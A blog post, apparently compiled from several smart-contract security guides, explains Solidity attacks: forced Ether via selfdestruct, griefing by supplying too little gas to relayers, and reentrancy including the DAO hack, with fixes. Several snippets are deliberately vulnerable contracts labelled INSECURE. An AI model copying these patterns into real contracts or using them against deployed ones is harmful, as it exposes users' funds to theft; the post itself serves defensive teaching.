		
<figure class="wp-block-image size-large"><img decoding="async" width="1024" height="576" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/042-1-1024x576.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2256" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/042-1-1024x576.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/042-1-300x169.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/042-1-768x432.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/042-1.png 1280w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p></p>



<p>Earlier we touched on the topic: <em><a href="https://cryptodeeptech.ru/improving-overall-security/" target="_blank" rel="noreferrer noopener">“Improving the overall security of the ecosystem from attacks on smart contracts”</a></em>. In this article, we will continue to develop this painful topic of ecosystem security. Occasionally, it is unwanted for users to be able to send Ether to a smart contract. Unfortunately for these circumstances, it’s possible to bypass a contract fallback function and forcibly send Ether.</p>



<pre class="wp-block-code"><code>contract Vulnerable {
    function () payable {
        revert();
    }

    function somethingBad() {
        require(this.balance &gt; 0);
        // Do something bad
    }
}
</code></pre>



<p>Though it seems like any transaction to the Vulnerable contract should be reverted, there are actually a couple ways to forcibly send Ether.</p>



<p>The first method is to call the&nbsp;<code>selfdestruct</code>&nbsp;method on a contract with the Vulnerable contract address set as the beneficiary. This works because&nbsp;<code>selfdestruct</code>&nbsp;will not trigger the fallback function.</p>



<p>Another method is to precompute a contract’s address and send Ether to the address before the contract is even deployed. Surprisingly enough, this is possible.</p>



<h1 class="wp-block-heading has-background" style="background-color:#f78da812">Force Feeding</h1>



<p>Forcing a smart contract to hold an Ether balance can influence its internal accounting and security assumptions. There are multiple ways a smart contract can receive Ether. The hierarchy is as follows:</p>



<ol>
<li>Check whether a payable external&nbsp;<code>receive</code>&nbsp;function is defined.</li>



<li>If not, check whether a payable external&nbsp;<code>fallback</code>&nbsp;function is defined.</li>



<li>Revert.</li>
</ol>



<p>The precedence of each function is explained in this great graphic from the&nbsp;<a href="https://solidity-by-example.org/sending-ether/">Solidity by Example</a>&nbsp;article:</p>



<pre id="__code_1" class="wp-block-code"><code>Which function is called, fallback() or receive()?

           send Ether
               |
         msg.data is empty?
              / \
            yes  no
            /     \
receive() exists?  fallback()
         /   \
        yes   no
        /      \
    receive()   fallback()
</code></pre>



<p>Consider the following example:</p>



<pre id="__code_2" class="wp-block-code"><code>pragma solidity ^0.8.13;

contract Vulnerable {
    receive() external payable {
        revert();
    }

    function somethingBad() external {
        require(address(this).balance &gt; 0);
        // Do something bad
    }
}
</code></pre>



<p>The contract’s logic seemingly disallows direct payments and prevents “something bad” from happening. However, calling&nbsp;<code>revert</code>&nbsp;in both&nbsp;<code>fallback</code>&nbsp;and&nbsp;<code>receive</code>&nbsp;<strong>cannot prevent the contract from receiving Ether</strong>. The following techniques can be used to force-feed Ether to a smart contract.</p>



<h3 class="wp-block-heading has-background" id="selfdestruct" style="background-color:#f78da812">Selfdestruct</h3>



<p>When the&nbsp;<code>SELFDESTRUCT</code>&nbsp;opcode is called, funds of the calling address are sent to the address on the stack, and execution is immediately halted. Since this opcode works on the EVM-level, Solidity-level functions that might block the receipt of Ether&nbsp;<a href="https://solidity.readthedocs.io/en/develop/security-considerations.html#sending-and-receiving-ether">will not be executed</a>.</p>



<h3 class="wp-block-heading has-background" id="pre-calculated-deployments" style="background-color:#f78da812">Pre-calculated Deployments</h3>



<p>Additionally, the target address of newly deployed smart contracts is generated in a deterministic fashion. The address generation can be looked up in any EVM implementation, such as the&nbsp;<a href="https://github.com/ethereum/py-evm/blob/e924f63992a35212616b4e20355d161bc4348925/eth/_utils/address.py#L17-L18">py-evm reference implementation</a>&nbsp;by the Ethereum Foundation:</p>



<pre id="__code_3" class="wp-block-code"><code>def generate_contract_address(address: Address, nonce: int) -&gt; Address:
    return force_bytes_to_address(keccak(rlp.encode([address, nonce])))
</code></pre>



<p>An attacker can send funds to this address before the deployment has happened. This is also illustrated by&nbsp;<a href="https://github.com/Arachnid/uscc/tree/master/submissions-2017/ricmoo">this 2017 Underhanded Solidity Contest submission</a>.</p>



<h3 class="wp-block-heading has-background" id="block-rewards-and-coinbase" style="background-color:#f78da812">Block Rewards and Coinbase</h3>



<p>Depending on the attacker’s capabilities, they can also start proof-of-work mining. By setting the target address to their&nbsp;<code>coinbase</code>, block rewards will be added to its balance. As this is yet another EVM-level capability, checks performed by Solidity are ineffective.</p>



<h3 class="wp-block-heading has-background" id="solution" style="background-color:#f78da812">Solution</h3>



<p>The above effects illustrate that relying on exact comparisons to the contract’s Ether balance is unreliable. The smart contract’s business logic must consider that the actual balance associated with it can be higher than the internal accounting’s value.</p>



<p>In general, we strongly advise against using the contract’s balance as a guard.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" loading="lazy" width="1012" height="818" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-3.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2207" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-3.png 1012w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-3-300x242.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-3-768x621.png 768w" sizes="(max-width: 1012px) 100vw, 1012px"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-large is-resized"><img decoding="async" loading="lazy" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-1024x729.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2202" width="840" height="598" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-1024x729.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-300x214.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-768x547.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image.png 1087w" sizes="(max-width: 840px) 100vw, 840px"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-large"><img decoding="async" loading="lazy" width="1024" height="535" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-1-1024x535.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2203" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-1-1024x535.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-1-300x157.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-1-768x401.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-1.png 1476w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Insufficient Gas Griefing</h2>



<p>Griefing is a type of attack often performed in video games, where a malicious user plays a game in an unintended way to bother other players, also known as trolling. This type of attack is also used to prevent transactions from being performed as intended.</p>



<p>This attack can be done on contracts which accept data and use it in a sub-call on another contract. This method is often used in multisignature wallets as well as transaction relayers. If the sub-call fails, either the whole transaction is reverted, or execution is continued.</p>



<p>Let’s consider a simple relayer contract as an example. As shown below, the relayer contract allows someone to make and sign a transaction, without having to execute the transaction. Often this is used when a user can’t pay for the gas associated with the transaction.</p>



<pre class="wp-block-code"><code>contract Relayer {
    mapping (bytes =&gt; bool) executed;

    function relay(bytes _data) public {
        // replay protection; do not call the same transaction twice
        require(executed[_data] == 0, "Duplicate call");
        executed[_data] = true;
        innerContract.call(bytes4(keccak256("execute(bytes)")), _data);
    }
}
</code></pre>



<p>The user who executes the transaction, the ‘forwarder’, can effectively censor transactions by using just enough gas so that the transaction executes, but not enough gas for the sub-call to succeed.</p>



<p>There are two ways this could be prevented. The first solution would be to only allow trusted users to relay transactions. The other solution is to require that the forwarder provides enough gas, as seen below.</p>



<pre class="wp-block-code"><code>// contract called by Relayer
contract Executor {
    function execute(bytes _data, uint _gasLimit) {
        require(gasleft() &gt;= _gasLimit);
        ...
    }
}</code></pre>



<h1 class="wp-block-heading has-background" style="background-color:#f78da812">Griefing</h1>



<p>This attack may be possible on a contract which accepts generic data and uses it to make a call another contract (a ‘sub-call’) via the low level&nbsp;<code>address.call()</code>&nbsp;function, as is often the case with multisignature and transaction relayer contracts.</p>



<p>If the call fails, the contract has two options:</p>



<ol>
<li>revert the whole transaction</li>



<li>continue execution.</li>
</ol>



<p>Take the following example of a simplified&nbsp;<code>Relayer</code>&nbsp;contract which continues execution regardless of the outcome of the subcall:</p>



<pre id="__code_1" class="wp-block-code"><code>contract Relayer {
    mapping (bytes =&gt; bool) executed;

    function relay(bytes _data) public {
        // replay protection; do not call the same transaction twice
        require(executed[_data] == 0, "Duplicate call");
        executed[_data] = true;
        innerContract.call(bytes4(keccak256("execute(bytes)")), _data);
    }
}
</code></pre>



<p>This contract allows transaction relaying. Someone who wants to make a transaction but can’t execute it by himself (e.g. due to the lack of ether to pay for gas) can sign data that he wants to pass and transfer the data with his signature over any medium. A third party “forwarder” can then submit this transaction to the network on behalf of the user.</p>



<p>If given just the right amount of gas, the&nbsp;<code>Relayer</code>&nbsp;would complete execution recording the&nbsp;<code>_data</code>argument in the&nbsp;<code>executed</code>&nbsp;mapping, but the subcall would fail because it received insufficient gas to complete execution.</p>



<p>An attacker can use this to censor transactions, causing them to fail by sending them with a low amount of gas. This attack is a form of “<a href="https://en.wikipedia.org/wiki/Griefer">griefing</a>“: It doesn’t directly benefit the attacker, but causes grief for the victim. A dedicated attacker, willing to consistently spend a small amount of gas could theoretically censor all transactions this way, if they were the first to submit them to&nbsp;<code>Relayer</code>.</p>



<p>One way to address this is to implement logic requiring forwarders to provide enough gas to finish the subcall. If the miner tried to conduct the attack in this scenario, the&nbsp;<code>require</code>&nbsp;statement would fail and the inner call would revert. A user can specify a minimum gasLimit along with the other data (in this example, typically the&nbsp;<code>_gasLimit</code>&nbsp;value would be verified by a signature, but that is omitted for simplicity in this case).</p>



<pre id="__code_2" class="wp-block-code"><code>// contract called by Relayer
contract Executor {
    function execute(bytes _data, uint _gasLimit) {
        require(gasleft() &gt;= _gasLimit);
        ...
    }
}
</code></pre>



<p>Another solution is to permit only trusted accounts to relay the transaction.</p>



<p>This question is about the&nbsp;<em>verb</em>&nbsp;“to grief” rather than the&nbsp;<em>noun</em>&nbsp;“grief”.</p>



<p>The latter is presumably what lots of people are currently feeling due to the drop in cryptocurrency prices.</p>



<p>The former, which is what you’re asking about, is when someone uses a system in an unexpected way to create what other users of the system might call an attack.&nbsp;<strong>Such an attack doesn’t benefit the attacker, but does make using the system more difficult for the victim.</strong>&nbsp;(i.e. It causes them grief [noun].)</p>



<p>It’s a common term in computer games, where the person performing the griefing is referred to as the&nbsp;<a href="https://en.wikipedia.org/wiki/Griefer">griefer</a>.</p>



<p>For an example in the Ethereum world, take a look at the&nbsp;<a href="https://consensys.github.io/smart-contract-best-practices/known_attacks/#insufficient-gas-griefing">Insufficient Gas Griefing</a>&nbsp;attack.</p>



<p>I’m really not very familiar with griefing attacks but based on the definition I’d say they&nbsp;<em>can</em>&nbsp;be profitable for the attacker. Not directly but indirectly.</p>



<p>My not-too-scientific analysis is based on the example given in the linked answer’s references:&nbsp;<a href="https://consensys.github.io/smart-contract-best-practices/known_attacks/#insufficient-gas-griefing">https://consensys.github.io/smart-contract-best-practices/known_attacks/#insufficient-gas-griefing</a></p>



<p>This is not a perfect example but at least something: imagine a contract which is used for finding out whether anyone disagrees or agrees with some idea. So a maximum of one “yes” and a maximum of one “no” is enough for the contract. Now for some reason it needs to be called through such a Relayer contract. If the attacker performs a griefing attack on the “yes” or the “no” answer the answer doesn’t get stored but nobody else can give that answer anymore as the Relayer has already blocked that answer. That way the attacker knows nobody can give an answer he doesn’t like.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-large"><img decoding="async" loading="lazy" width="1024" height="516" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-2-1024x516.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2206" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-2-1024x516.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-2-300x151.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-2-768x387.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-2.png 1516w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p></p>



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Reentrancy</h2>



<p>Reentrancy is an attack that can occur when a bug in a contract function can allow a function interaction to proceed multiple times when it should otherwise be prohibited. This can be used to drain funds from a smart contract if used maliciously. In fact, reentrancy was the attack vector used in the DAO hack.</p>



<h3 class="wp-block-heading has-background" style="background-color:#f78da812"><a href="https://github.com/allpaca/smart-contract-attack-vectors/blob/master/attacks/reentrancy.md#single-function-reentrancy"></a>Single function reentrancy</h3>



<p>A single function reentrancy attack occurs when a vulnerable function is the same function that an attacker is trying to recursively call.</p>



<pre class="wp-block-code"><code>// INSECURE
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(msg.sender.call.value(amount)());
    balances[msg.sender] = 0;
}
</code></pre>



<p>Here we can see that the balance is only modified after the funds have been transferred. This can allow a hacker to call the function many times before the balance is set to 0, effectively draining the smart contract.</p>



<h3 class="wp-block-heading has-background" style="background-color:#f78da812"><a href="https://github.com/allpaca/smart-contract-attack-vectors/blob/master/attacks/reentrancy.md#cross-function-reentrancy"></a>Cross-function reentrancy</h3>



<p>A cross-function reentrancy attack is a more complex version of the same process. Cross-function reentrancy occurs when a vulnerable function shares state with a function that an attacker can exploit.</p>



<pre class="wp-block-code"><code>// INSECURE
function transfer(address to, uint amount) external {
  if (balances[msg.sender] &gt;= amount) {
    balances[to] += amount;
    balances[msg.sender] -= amount;
  }
}

function withdraw() external {
  uint256 amount = balances[msg.sender];
  require(msg.sender.call.value(amount)());
  balances[msg.sender] = 0;
}
</code></pre>



<p>In this example, a hacker can exploit this contract by having a fallback function call&nbsp;<code>transfer()</code>&nbsp;to transfer spent funds before the balance is set to 0 in the&nbsp;<code>withdraw()</code>&nbsp;function.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><img decoding="async" loading="lazy" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-4.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2210" width="842" height="360" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-4.png 668w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-4-300x128.png 300w" sizes="(max-width: 842px) 100vw, 842px"></figure></div>


<h3 class="wp-block-heading has-background" style="background-color:#f78da812"><a href="https://github.com/allpaca/smart-contract-attack-vectors/blob/master/attacks/reentrancy.md#reentrancy-prevention"></a>Reentrancy prevention</h3>



<p>When transfering funds in a smart contract, use&nbsp;<code>send</code>&nbsp;or&nbsp;<code>transfer</code>&nbsp;instead of&nbsp;<code>call</code>. The problem with using&nbsp;<code>call</code>&nbsp;is that unlike the other functions, it doesn’t have a gas limit of 2300. This means that&nbsp;<code>call</code>&nbsp;can be used in external function calls which can be used to perform reentrancy attacks.</p>



<p>Another solid prevention method is to&nbsp;<strong>mark untrusted functions</strong>.</p>



<pre class="wp-block-code"><code>function untrustedWithdraw() public {
  uint256 amount = balances[msg.sender];
  require(msg.sender.call.value(amount)());
  balances[msg.sender] = 0;
}
</code></pre>



<p>In addition, for optimum security use the&nbsp;<strong>checks-effects-interactions pattern</strong>. This is a simple rule of thumb for ordering smart contract functions.</p>



<p>The function should begin with&nbsp;<em>checks</em>, e.g.&nbsp;<code>require</code>&nbsp;and&nbsp;<code>assert</code>&nbsp;statements.</p>



<p>Next, the&nbsp;<em>effects</em>&nbsp;of the contract should be performed, i.e. state modifications.</p>



<p>Finally, we can perform&nbsp;<em>interactions</em>&nbsp;with other smart contracts, e.g. external function calls.</p>



<p>This structure is effective against reentrancy because the modified state of the contract will prevent bad actors from performing malicious interactions.</p>



<pre class="wp-block-code"><code>function withdraw() external {
  uint256 amount = balances[msg.sender];
  balances[msg.sender] = 0;
  require(msg.sender.call.value(amount)());
}
</code></pre>



<p>Since the balance is set to 0 before any interactions are performed, if the contract is called recursively, there is nothing to send after the first transaction.</p>



<h1 class="wp-block-heading has-background" style="background-color:#f78da812">Reentrancy</h1>



<p>One of the major dangers of&nbsp;<a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/">calling external contracts</a>&nbsp;is that they can take over the control flow, and make changes to your data that the calling function wasn’t expecting. This class of bugs can take many forms, and both of the major bugs that led to the DAO’s collapse were bugs of this sort.</p>



<h3 class="wp-block-heading" id="reentrancy-on-a-single-function">Reentrancy on a Single Function</h3>



<p>The first version of this bug to be noticed involved functions that could be called repeatedly, before the first invocation of the function was finished. This may cause the different invocations of the function to interact in destructive ways.</p>



<pre id="__code_1" class="wp-block-code"><code>// INSECURE
mapping (address =&gt; uint) private userBalances;

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    (bool success, ) = msg.sender.call.value(amountToWithdraw)(""); // At this point, the caller's code is executed, and can call withdrawBalance again
    require(success);
    userBalances[msg.sender] = 0;
}
</code></pre>



<p>Since the user’s balance is not set to 0 until the very end of the function, the second (and later) invocations will still succeed and will withdraw the balance over and over again.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><img decoding="async" loading="lazy" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-5.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2213" width="844" height="1143"><figcaption class="wp-element-caption"><code><a href="https://www.hackread.com/ex-crypto-ceo-suspected-ethereum-dao-hack-2016/" target="_blank" rel="noreferrer noopener">https://www.hackread.com/ex-crypto-ceo-suspected-ethereum-dao-hack-2016/</a></code></figcaption></figure></div>

<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://www.hackread.com/ex-crypto-ceo-suspected-ethereum-dao-hack-2016/" target="_blank" rel="noreferrer noopener"><img decoding="async" loading="lazy" width="1550" height="88" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-6.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2214"></a></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>On June 17<sup>th</sup>&nbsp;2016,&nbsp;<a href="https://www.coindesk.com/understanding-dao-hack-journalists">The DAO</a>&nbsp;was hacked and 3.6 million Ether ($50 Million) were stolen using the first reentrancy attack. Ethereum Foundation issued a critical update to rollback the hack. This resulted in Ethereum being forked into Ethereum Classic and Ethereum.</p>



<p>In the example given, the best way to prevent this attack is to make sure you don’t call an external function until you’ve done all the internal work you need to do:</p>



<pre id="__code_2" class="wp-block-code"><code>mapping (address =&gt; uint) private userBalances;

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    userBalances[msg.sender] = 0;
    (bool success, ) = msg.sender.call.value(amountToWithdraw)(""); // The user's balance is already 0, so future invocations won't withdraw anything
    require(success);
}
</code></pre>



<p>Note that if you had another function which called&nbsp;<code>withdrawBalance()</code>, it would be potentially subject to the same attack, so you must treat any function which calls an untrusted contract as itself untrusted. See below for further discussion of potential solutions.</p>



<h3 class="wp-block-heading has-background" id="cross-function-reentrancy" style="background-color:#f78da812">Cross-function Reentrancy</h3>



<p>An attacker may also be able to do a similar attack using two different functions that share the same state.</p>



<pre id="__code_3" class="wp-block-code"><code>// INSECURE
mapping (address =&gt; uint) private userBalances;

function transfer(address to, uint amount) {
    if (userBalances[msg.sender] &gt;= amount) {
       userBalances[to] += amount;
       userBalances[msg.sender] -= amount;
    }
}

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    (bool success, ) = msg.sender.call.value(amountToWithdraw)(""); // At this point, the caller's code is executed, and can call transfer()
    require(success);
    userBalances[msg.sender] = 0;
}
</code></pre>



<p>In this case, the attacker calls&nbsp;<code>transfer()</code>&nbsp;when their code is executed on the external call in&nbsp;<code>withdrawBalance</code>. Since their balance has not yet been set to 0, they are able to transfer the tokens even though they already received the withdrawal. This vulnerability was also used in the DAO attack.</p>



<p>The same solutions will work, with the same caveats. Also note that in this example, both functions were part of the same contract. However, the same bug can occur across multiple contracts, if those contracts share state.</p>



<h3 class="wp-block-heading has-background" id="pitfalls-in-reentrancy-solutions" style="background-color:#f78da812">Pitfalls in Reentrancy Solutions</h3>



<p>Since reentrancy can occur across multiple functions, and even multiple contracts, any solution aimed at preventing reentrancy with a single function will not be sufficient.</p>



<p>Instead,&nbsp;we have recommended finishing all internal work (ie. state changes) first, and only then calling the external function. This rule, if followed carefully, will allow you to avoid vulnerabilities due to reentrancy. However, you need to not only avoid calling external functions too soon, but also avoid calling functions which call external functions. For example, the following is insecure:</p>



<pre id="__code_4" class="wp-block-code"><code>// INSECURE
mapping (address =&gt; uint) private userBalances;
mapping (address =&gt; bool) private claimedBonus;
mapping (address =&gt; uint) private rewardsForA;

function withdrawReward(address recipient) public {
    uint amountToWithdraw = rewardsForA[recipient];
    rewardsForA[recipient] = 0;
    (bool success, ) = recipient.call.value(amountToWithdraw)("");
    require(success);
}

function getFirstWithdrawalBonus(address recipient) public {
    require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once

    rewardsForA[recipient] += 100;
    withdrawReward(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.
    claimedBonus[recipient] = true;
}
</code></pre>



<p>Even though&nbsp;<code>getFirstWithdrawalBonus()</code>&nbsp;doesn’t directly call an external contract, the call in&nbsp;<code>withdrawReward()</code>&nbsp;is enough to make it vulnerable to a reentrancy. You therefore need to treat&nbsp;<code>withdrawReward()</code>&nbsp;as if it were also untrusted.</p>



<pre id="__code_5" class="wp-block-code"><code>mapping (address =&gt; uint) private userBalances;
mapping (address =&gt; bool) private claimedBonus;
mapping (address =&gt; uint) private rewardsForA;

function untrustedWithdrawReward(address recipient) public {
    uint amountToWithdraw = rewardsForA[recipient];
    rewardsForA[recipient] = 0;
    (bool success, ) = recipient.call.value(amountToWithdraw)("");
    require(success);
}

function untrustedGetFirstWithdrawalBonus(address recipient) public {
    require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once

    claimedBonus[recipient] = true;
    rewardsForA[recipient] += 100;
    untrustedWithdrawReward(recipient); // claimedBonus has been set to true, so reentry is impossible
}
</code></pre>



<p>In addition to the fix making reentry impossible,&nbsp;<a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/">untrusted functions have been marked</a>. This same pattern repeats at every level: since&nbsp;<code>untrustedGetFirstWithdrawalBonus()</code>&nbsp;calls&nbsp;<code>untrustedWithdrawReward()</code>, which calls an external contract, you must also treat&nbsp;<code>untrustedGetFirstWithdrawalBonus()</code>&nbsp;as insecure.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><img decoding="async" loading="lazy" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-7.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2219" width="849" height="611" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-7.png 599w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-7-300x216.png 300w" sizes="(max-width: 849px) 100vw, 849px"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Another solution often suggested is a&nbsp;<a href="https://en.wikipedia.org/wiki/Mutual_exclusion">mutex</a>. This allows you to “lock” some state so it can only be changed by the owner of the lock. A simple example might look like this:</p>



<pre id="__code_6" class="wp-block-code"><code>// Note: This is a rudimentary example, and mutexes are particularly useful where there is substantial logic and/or shared state
mapping (address =&gt; uint) private balances;
bool private lockBalances;

function deposit() payable public returns (bool) {
    require(!lockBalances);
    lockBalances = true;
    balances[msg.sender] += msg.value;
    lockBalances = false;
    return true;
}

function withdraw(uint amount) payable public returns (bool) {
    require(!lockBalances &amp;&amp; amount &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);
    lockBalances = true;

    (bool success, ) = msg.sender.call.value(amount)("");

    if (success) { // Normally insecure, but the mutex saves it
      balances[msg.sender] -= amount;
    }

    lockBalances = false;
    return true;
}
</code></pre>



<p>If the user tries to call&nbsp;<code>withdraw()</code>&nbsp;again before the first call finishes, the lock will prevent it from having any effect. This can be an effective pattern, but it gets tricky when you have multiple contracts that need to cooperate. The following is insecure:</p>



<pre id="__code_7" class="wp-block-code"><code>// INSECURE
contract StateHolder {
    uint private n;
    address private lockHolder;

    function getLock() {
        require(lockHolder == address(0));
        lockHolder = msg.sender;
    }

    function releaseLock() {
        require(msg.sender == lockHolder);
        lockHolder = address(0);
    }

    function set(uint newState) {
        require(msg.sender == lockHolder);
        n = newState;
    }
}
</code></pre>



<p>An attacker can call&nbsp;<code>getLock()</code>, and then never call&nbsp;<code>releaseLock()</code>. If they do this, then the contract will be locked forever, and no further changes will be able to be made. If you use mutexes to protect against reentrancy, you will need to carefully ensure that there are no ways for a lock to be claimed and never released. (There are other potential dangers when programming with mutexes, such as deadlocks and livelocks. You should consult the large amount of literature already written on mutexes, if you decide to go this route.)</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Above were examples of reentrancy involving the attacker executing malicious code&nbsp;<em>within a single transaction</em>. The following are a different type of attack inherent to Blockchains: the fact that&nbsp;<em>the order of transactions themselves</em>&nbsp;(e.g. within a block) is easily subject to manipulation.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" loading="lazy" width="940" height="578" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-8.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2222" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-8.png 940w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-8-300x184.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-8-768x472.png 768w" sizes="(max-width: 940px) 100vw, 940px"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image size-full"><img decoding="async" loading="lazy" width="965" height="714" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-9.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2223" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-9.png 965w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-9-300x222.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-9-768x568.png 768w" sizes="(max-width: 965px) 100vw, 965px"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image size-full"><img decoding="async" loading="lazy" width="1007" height="697" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-10.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2224" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-10.png 1007w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-10-300x208.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-10-768x532.png 768w" sizes="(max-width: 1007px) 100vw, 1007px"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p></p>



<p></p>



<p></p>



<p class="has-medium-font-size">Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack Contract</p>



<p id="353f">to code smart contracts is certainly not a free picnic. A bug introduced in the code costs money and most likely not only your money but also&nbsp;<a href="http://hackingdistributed.com/2016/06/17/thoughts-on-the-dao-hack/" target="_blank" rel="noreferrer noopener">other people’s&nbsp;</a>as well. The reality is that the Ethereum ecosystem is still in its infancy but growing and standards are being defined and redefined by the day so one needs to be always updated and akin to smart contract security best practices.</p>



<p id="ac52">As a student of smart contract security, I have been on the look out for vulnerabilities in code. It came to my attention this&nbsp;<a href="https://ropsten.etherscan.io/address/0xb03486280c91ab32544aae181f47362dc67c139c" rel="noreferrer noopener" target="_blank">contract deployed to the testnet</a>.</p>



